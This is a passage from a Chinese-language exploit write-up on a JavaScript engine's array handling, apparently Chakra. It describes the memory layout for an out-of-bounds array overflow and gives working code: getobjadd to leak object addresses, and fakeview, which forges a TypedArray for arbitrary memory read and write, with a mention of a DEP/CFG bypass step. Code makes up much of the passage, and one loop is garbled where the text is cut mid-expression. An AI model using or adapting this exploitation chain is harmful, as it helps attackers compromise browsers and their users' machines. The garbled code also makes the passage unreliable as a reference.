3)此时的内存布局如下：
    Buffer--------> ---------------------------    | 0x20 内存块头部|
    Arrint.seg--------->| |
    | |
    | |
    | 0x3000 内存块|
    | |
    | |
    Arrvar.seg———>| |
    | |
    | |
    | |
    | |
内存就是下面这样，注意连个地址之间相隔0x3020,中间是占位产生的数据
arrint是NativeIntArray,
其seg的size为0x802，每个元素的长度为4byte，共为0x802*4+0x20+0x18=0x2040bytes长度，然后因为内存页对齐的原因为0x3000byte，所以中间空余了0x3000。此时我们可以通过arrint越界去读写arrvar的buffer部分了，这就已经完成对象地址的泄露了。
    function getobjadd(myvar)
    {
      arrvar[3]=myvar;
      uint32[0]=arrint[0xc06];
      return  arrint[0xc07]*0x100000000+uint32[0];    
    }
4)紧接着通过调用fakeview 函数来伪造一个完全可控的TypedArray对象myview 实现任意地址读写。
    var buffer1 =  new ArrayBuffer(0x100);
    var view1    =  new Uint32Array(buffer1);
    var view2    =  new Uint32Array(buffer1);
    var view3    =  new Uint32Array(buffer1);
    var view4    =  new Uint32Array(buffer1);
    function fakeview( )
    {
    arrint.length=0xffff0000;  //arrint长度修改
    arrvar[0]=buffer1;
    arrvar[1]=view2;
    arrvar[2]=0;
    //修改arrint 的segment.next 指向view2+0x28
    write(0x00000d,0x001000,0x100000,arrint[0xc03]);
    write(0x00000c,0x001000,0x100000,arrint[0xc02]+0x28);
View+0x28位置是存放的buffer1对象的地址:
使用arrint[0xc00]越界就可以获取到buffer1对象地址0x186-e96a5300低4字节。
    uint32[0]=arrint[0xc00];
    index=uint32[0];
    //中间使用unit32[0]是用来做符号转换的，index就是buffer1对象的地址低4字节。因为seg.next指向view2+0x28,view2+0x28的值为buffer1,所以下一个seg的seg.left就是buffer1的低4字节，这个段的索引号就是从index开始。
Seg的头长度0x18，后面接的是具体数组数据，这样0x28+0x18=0x40，view2对象的长度是0x40，这时候seg的数组数据区域就刚好指向下一个view对象0x186`e9800dc0，可能是紧挨着的view1或者view3。
    //通过越界读复制view1或者view3 对象的0x40字节到view4 的buff 区域
    for(var i=0;i find i="+i+"");
          bypassdepcfg();
          break;
       }
    }
    function getarrint(i)
    {  
      arr[i].length=0x10000;
      arrint=arr[i];  
      arrvar=arr[i+1];
      write(0x09,0x001000,0x100000,0x0001000);
      write(0x0a,0x001000,0x100000,0x0001000);
    }
    function fakeview( )
    {
      arrint.length=0xffff0000;  
      arrvar[0]=buffer1;
      arrvar[1]=view2;
      arrvar[2]=0;
      write(0x0d,0x001000,0x100000,arrint[0xc03]);
      write(0x0c,0x001000,0x100000,arrint[0xc02]+0x28);    
      uint32[0]=arrint[0xc00];
      index=uint32[0];
      for(var i=0;i<0x10;i++) view4[i]=arrint[index+i];
      write(0x0d,0x0001000,0x100000,0);
      write(0x0c,0x0001000,0x100000,0);   
      arrint[0xc04]=view4[0x0e];
      arrint[0xc05]=view4[0x0f];
      myview=arrvar[2];
    }